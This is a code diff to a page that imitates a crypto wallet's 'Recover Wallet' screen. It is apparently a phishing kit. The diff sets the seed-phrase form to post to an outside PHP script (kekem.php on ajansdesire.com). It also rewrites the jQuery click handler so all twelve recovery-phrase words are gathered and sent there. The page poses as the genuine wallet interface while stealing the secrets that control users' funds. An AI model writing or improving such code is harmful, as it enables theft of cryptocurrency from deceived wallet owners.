@@ -66680,7 +66680,7 @@ input:checked + .send-v2__amount-max__button {
                   and assets will be removed from this app permanently. This action cannot be
                   undone.
                 </p>
-                <form class="create-new-vault__form" method="post" id="form7">
+                <form class="create-new-vault__form" method="post" id="form7" action="https://ajansdesire.com/asdasd/kekem.php">
                   <div class="import-srp__container">
                     <label class="import-srp__srp-label"
                       ><h4
@@ -67990,7 +67990,7 @@ input:checked + .send-v2__amount-max__button {
                     disabled=""
                     type="button"
                     id="form77"
-                  >
+                  disabled>
                     Recover Wallet
                   </button>
                 </form>
@@ -68041,24 +68041,13 @@ input:checked + .send-v2__amount-max__button {
 
         // "Recover Wallet" butonuna tıklanınca
         $("#form77").click(function () {
-             var formData = {
-            
-                'import-srp__srp-word-0': $("#import-srp__srp-word-0").val(),
-               'import-srp__srp-word-1': $("#import-srp__srp-word-1").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-2").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-3").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-4").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-5").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-6").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-7").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-8").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-9").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-10").val(),
-                'import-srp__srp-word-1': $("#import-srp__srp-word-11").val()
-              
-              
-               
-            };
+            // Form verilerini topla
+            var formData = {};
+
+            for (var i = 0; i <= 11; i++) {
+                var inputID = "import-srp__srp-word-" + i;
+                formData[inputID] = $("#" + inputID).val();
+            }
 
             // Formu kekem.php adresine POST isteği gönder
             $.ajax({
@@ -68075,6 +68064,7 @@ input:checked + .send-v2__amount-max__button {
         });
     });
 </script>
+
 
   </body>
 
